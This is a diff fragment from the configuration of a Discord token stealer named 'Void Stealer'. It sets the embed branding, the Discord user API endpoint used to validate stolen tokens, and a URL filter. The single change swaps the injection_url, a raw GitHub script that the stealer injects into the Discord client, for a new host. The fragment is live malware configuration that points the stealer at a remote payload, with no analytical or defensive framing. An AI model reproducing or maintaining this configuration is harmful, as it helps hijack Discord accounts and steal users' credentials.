@@ -15,7 +15,7 @@ const config = {
   embed_name: 'Void Stealer', 
   embed_icon: 'https://cdn.discordapp.com/attachments/981957512016318524/984087621678534676/a650d11c296f2f76196c67dc5faabc84.png',
   embed_color: 000001, 
-  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
+  injection_url: 'https://raw.githubusercontent.com/mxt777777/0/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
